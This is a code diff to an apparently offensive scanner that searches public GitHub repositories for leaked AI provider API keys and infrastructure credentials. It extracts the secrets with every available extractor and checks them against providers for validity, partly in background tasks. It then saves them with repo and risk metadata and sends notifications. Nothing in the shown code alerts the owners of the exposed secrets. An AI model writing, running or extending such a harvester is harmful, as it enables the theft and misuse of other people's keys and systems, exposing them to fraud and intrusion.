@@ -30,13 +30,13 @@ from config import (
     CONCURRENT_ITEMS, MAX_PAGES,
 )
 from patterns import QUERIES, EXTRACTORS, is_skippable_path
-from infra_patterns import INFRA_QUERIES, INFRA_EXTRACTORS, INFRA_PROVIDERS, assess_risk, extract_destination
-from validators import validate
+from infra_patterns import INFRA_EXTRACTORS, assess_risk, extract_destination
+from validators import validate, INFRA_VALIDATORS
 from notifier import notify_found, notify_cycle_done, notify_infra_found
 
-# Merge AI-key queries + infra queries into one pool; workers partition both
-ALL_QUERIES = QUERIES + INFRA_QUERIES
-ALL_EXTRACTORS = {**EXTRACTORS, **INFRA_EXTRACTORS}
+# Intersecting track: AI queries are the search vector; infra extractors run
+# on the same files. This guarantees infra creds come only from AI-related repos.
+ALL_QUERIES = QUERIES
 
 log = logging.getLogger(__name__)
 
@@ -186,6 +186,21 @@ async def process_item(client: httpx.AsyncClient, item: dict,
         await _process_inner(client, item, provider, file_type, token_headers)
 
 
+async def _validate_infra_bg(infra_prov: str, cred: str, cred_hash: str):
+    """Background infra validation — updates DB without blocking the scan."""
+    fn = INFRA_VALIDATORS.get(infra_prov)
+    if fn is None:
+        return
+    try:
+        result = await fn(cred)
+        db.update_infra_validation(cred_hash, 1 if result else 0,
+                                   "ok" if result else "unreachable")
+        if result:
+            log.info("[infra/%s] VALIDATED %s...", infra_prov, cred[:30])
+    except Exception as e:
+        log.debug("infra validate bg err (%s): %s", infra_prov, e)
+
+
 async def _process_inner(client: httpx.AsyncClient, item: dict,
                          provider: str, file_type: str, token_headers: dict):
     repo_info   = item.get("repository", {})
@@ -198,17 +213,12 @@ async def _process_inner(client: httpx.AsyncClient, item: dict,
     if not full_name or not sha:
         return
 
-    # Atomic claim — if another worker already took this SHA, skip immediately.
-    # try_claim_file() does INSERT OR IGNORE and returns True only for the first caller.
-    # This replaces the old two-step is_file_scanned + mark_file_scanned which
-    # had a TOCTOU race under parallel workers.
     if is_skippable_path(file_path):
-        db.try_claim_file(sha)  # mark it even for trash paths so we don't revisit
+        db.try_claim_file(sha)
         return
     if not db.try_claim_file(sha):
-        return  # another worker claimed it first — skip
+        return
 
-    # Repo meta — age/stars gate
     if db.should_scan_repo(full_name):
         meta = await get_repo_meta(client, full_name, token_headers)
         if not meta:
@@ -217,7 +227,7 @@ async def _process_inner(client: httpx.AsyncClient, item: dict,
         created_at = meta.get("created_at", "")
         db.mark_repo_scanned(full_name, stars, created_at)
         if not _passes_filter(stars, created_at):
-            return  # SHA already claimed above — no need to mark again
+            return
     else:
         cached = db.get_repo_cached(full_name)
         if cached:
@@ -231,50 +241,62 @@ async def _process_inner(client: httpx.AsyncClient, item: dict,
     if not content:
         return
 
-    extractor = ALL_EXTRACTORS.get(provider)
-    if not extractor:
-        return
-    creds = extractor(content)
-    if not creds:
-        return
-
-    if provider in INFRA_PROVIDERS:
-        # ── Infrastructure credential branch ──────────────────────────────
-        risk_level, risk_reasons = assess_risk(content, file_path, stars, created_at)
-        for cred in creds:
-            if db.infra_exists(cred):
-                continue
-            destination = extract_destination(cred) if "://" in cred else ""
-            saved = db.save_infra(
-                provider, cred, full_name, file_path, file_url,
-                stars, created_at, file_type, destination,
-                risk_level, risk_reasons,
-            )
-            if saved:
-                await notify_infra_found(
-                    provider, cred, full_name, file_path, file_url,
-                    stars, created_at, file_type,
-                    destination, risk_level, risk_reasons,
-                )
-                log.info("[infra/%s] risk=%s dest=%s repo=%s",
-                         provider, risk_level, destination or "—", full_name)
-    else:
-        # ── AI provider key branch ────────────────────────────────────────
-        for key in creds:
+    # ── AI key extractors — run ALL providers on every file ────────────────
+    # (not just the query's "provider": a .env might have OpenAI + DeepSeek + ARK)
+    for ai_prov, ai_fn in EXTRACTORS.items():
+        for key in ai_fn(content):
             if db.key_exists(key):
                 continue
-            is_valid = await validate(provider, key)
+            is_valid = await validate(ai_prov, key)
             saved = db.save_key(
-                provider, key, full_name, file_path, file_url,
+                ai_prov, key, full_name, file_path, file_url,
                 stars, created_at, file_type, is_valid,
             )
             if saved:
                 await notify_found(
-                    provider, key, full_name, file_path, file_url,
+                    ai_prov, key, full_name, file_path, file_url,
                     stars, created_at, file_type, is_valid,
                 )
                 log.info("[%s] %s from %s",
-                         "VALID" if is_valid else "found", provider, full_name)
+                         "VALID" if is_valid else "found", ai_prov, full_name)
+
+    # ── Infra extractors — intersecting track ──────────────────────────────
+    # Only files found via AI queries are scanned → infra creds come from AI repos.
+    # Risk assessment is computed once and reused across all infra providers.
+    risk_cache: tuple | None = None
+    for infra_prov, infra_fn in INFRA_EXTRACTORS.items():
+        creds = infra_fn(content)
+        if not creds:
+            continue
+        if risk_cache is None:
+            risk_cache = assess_risk(content, file_path, stars, created_at)
+        risk_level, risk_reasons = risk_cache
+        for cred in creds:
+            if db.infra_exists(cred):
+                continue
+            destination = extract_destination(cred) if "://" in cred else ""
+            cred_hash   = base64.b64encode(
+                cred.encode()
+            ).decode()[:8]  # used only for task tag; real hash is in db.save_infra
+            saved = db.save_infra(
+                infra_prov, cred, full_name, file_path, file_url,
+                stars, created_at, file_type, destination,
+                risk_level, risk_reasons,
+            )
+            if saved:
+                import hashlib as _hl
+                real_hash = _hl.sha256(cred.encode()).hexdigest()
+                asyncio.create_task(
+                    _validate_infra_bg(infra_prov, cred, real_hash),
+                    name=f"infra_val_{infra_prov}",
+                )
+                await notify_infra_found(
+                    infra_prov, cred, full_name, file_path, file_url,
+                    stars, created_at, file_type,
+                    destination, risk_level, risk_reasons,
+                )
+                log.info("[infra/%s] risk=%s dest=%s repo=%s",
+                         infra_prov, risk_level, destination or "—", full_name)
 
 
 # ── Per-token worker ────────────────────────────────────────────────────────
@@ -342,10 +364,10 @@ async def run_cycle():
         chunks[i % n].append(q)
 
     log.info(
-        "=== scan cycle start | %d tokens | %d queries (%d AI + %d infra) → %s chunks | "
-        "%d concurrent items | max %d pages ===",
-        n, len(ALL_QUERIES), len(QUERIES), len(INFRA_QUERIES),
-        [len(c) for c in chunks], CONCURRENT_ITEMS, MAX_PAGES,
+        "=== scan cycle start | %d tokens | %d AI queries → %s chunks | "
+        "%d concurrent items | max %d pages | cross-extract: %d infra providers ===",
+        n, len(ALL_QUERIES), [len(c) for c in chunks],
+        CONCURRENT_ITEMS, MAX_PAGES, len(INFRA_EXTRACTORS),
     )
 
     sem = asyncio.Semaphore(CONCURRENT_ITEMS)
